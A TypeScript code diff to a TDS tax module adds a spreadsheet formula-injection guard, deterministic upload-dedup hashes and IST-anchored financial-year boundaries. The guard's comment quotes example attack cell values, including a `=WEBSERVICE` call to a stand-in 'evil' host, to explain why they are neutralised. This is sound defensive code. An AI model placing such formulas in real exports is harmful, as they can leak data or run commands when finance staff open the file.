@@ -17,12 +17,73 @@
  * the nearest 100 paise = 1 rupee). BigInt arithmetic only — no floating-point.
  */
 
+import { createHash } from 'crypto';
 import * as XLSX from 'xlsx';
 import { rupeesToPaise, toPaiseBigInt } from '../common/money';
 import type { UploadResult, UploadRowError } from './dto/tds.dto';
 
 // ─── Re-export so consumers only need to import from tds.helpers ─────────────
 export type { UploadResult, UploadRowError };
+
+// ─── Spreadsheet formula-injection guard ─────────────────────────────────────
+
+/**
+ * Neutralise spreadsheet formula injection. A cell value that begins with
+ * `= + - @` (or a leading tab/CR) is interpreted as a live formula by Excel /
+ * Google Sheets — a partner-supplied deductee name like `=WEBSERVICE("http://evil")`
+ * or `=cmd()` would execute when finance opens the TDS export. Prefix such
+ * values with an apostrophe so they are always treated as text.
+ *
+ * Mirrors the proven `cellSafe` in invoices/invoice.helpers.ts. It is duplicated
+ * here (not imported) because that one is module-private and the TDS module may
+ * only touch files under src/tds — see the upload/export sanitisation.
+ */
+export function cellSafe(v: string): string {
+  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
+}
+
+// ─── File-level dedup hash (deterministic uploadBatchId) ─────────────────────
+
+/**
+ * Compute a DETERMINISTIC sha256 over the canonical content of an off-platform
+ * upload's parsed rows. Re-uploading the SAME file yields the SAME hash, so
+ * every row collides on the `tds_off_platform_entries_dedup_unique` partial index
+ * (which includes uploadBatchId) → skipped instead of double-counted. A DIFFERENT
+ * file (even one whose rows happen to match an earlier row) gets a different hash
+ * → its rows insert, preserving a genuine repeat 194R entry. (Owner: FILE-LEVEL dedup.)
+ *
+ * Canonicalisation: per-row tuple of the dedup-relevant fields, in file order,
+ * joined with field/row separators. Dates use the UTC ISO instant; amount uses
+ * the BigInt decimal string.
+ */
+export function offPlatformFileHash(rows: ParsedOffPlatformRow[]): string {
+  const canonical = rows
+    .map((r) =>
+      [
+        r.entryDate.toISOString(),
+        r.panNumber,
+        r.amountPaise.toString(),
+        r.outletCode ?? '',
+      ].join(''),
+    )
+    .join('');
+  return `OP-${createHash('sha256').update(canonical).digest('hex')}`;
+}
+
+/** Deterministic sha256 over a deposit upload's parsed rows. See offPlatformFileHash. */
+export function depositFileHash(rows: ParsedDepositRow[]): string {
+  const canonical = rows
+    .map((r) =>
+      [
+        r.depositDate.toISOString(),
+        r.panNumber,
+        r.amountPaise.toString(),
+        r.outletCode ?? '',
+      ].join(''),
+    )
+    .join('');
+  return `DEP-${createHash('sha256').update(canonical).digest('hex')}`;
+}
 
 // ─── Template builders ───────────────────────────────────────────────────────
 
@@ -339,18 +400,35 @@ export interface FyInfo {
   endExclusive: Date; // 1 Apr of the next year
 }
 
+/** India Standard Time is UTC+5:30 — the FY boundary is anchored here, not UTC. */
+const IST_OFFSET_MS = (5 * 60 + 30) * 60 * 1000;
+
 /**
- * Given any Date, return the FY that contains it.
- * FY n = 1 Apr (year n) → 31 Mar (year n+1).
+ * The UTC instant for 00:00 IST on 1 Apr of `year` — i.e. the start of the Indian
+ * financial year. 1 Apr 00:00 IST = 31 Mar 18:30 UTC, so we take the UTC midnight
+ * and shift back by the IST offset. Using this for the window boundary means a
+ * payment timestamped 31 Mar 18:30–23:59 UTC (= 1 Apr 00:00–05:29 IST) correctly
+ * lands in the NEW financial year, not the prior one.
+ */
+function aprilFirstIstInstant(year: number): Date {
+  return new Date(Date.UTC(year, 3, 1) - IST_OFFSET_MS);
+}
+
+/**
+ * Given any Date, return the FY that contains it (boundaries anchored to IST).
+ * FY n = 1 Apr 00:00 IST (year n) → 1 Apr 00:00 IST (year n+1), exclusive end.
  * e.g. 2026-01-15 → FY 2025-26 (starts 1 Apr 2025).
  */
 export function financialYear(date: Date): FyInfo {
-  const month = date.getUTCMonth(); // 0-indexed; April = 3
-  const year = date.getUTCFullYear();
+  // Shift the instant into IST wall-clock before extracting month/year, so a
+  // timestamp at e.g. 31 Mar 19:00 UTC (= 1 Apr 00:30 IST) is treated as April.
+  const ist = new Date(date.getTime() + IST_OFFSET_MS);
+  const month = ist.getUTCMonth(); // 0-indexed; April = 3
+  const year = ist.getUTCFullYear();
   // If January–March (months 0-2), we're in the FY that started the prior April.
   const fyStartYear = month < 3 ? year - 1 : year;
-  const start = new Date(Date.UTC(fyStartYear, 3, 1));         // 1 Apr
-  const endExclusive = new Date(Date.UTC(fyStartYear + 1, 3, 1)); // 1 Apr (next year)
+  const start = aprilFirstIstInstant(fyStartYear);         // 1 Apr 00:00 IST
+  const endExclusive = aprilFirstIstInstant(fyStartYear + 1); // 1 Apr 00:00 IST (next year)
   const fyLabel = `${fyStartYear}-${String(fyStartYear + 1).slice(2)}`;
   return { fyLabel, start, endExclusive };
 }
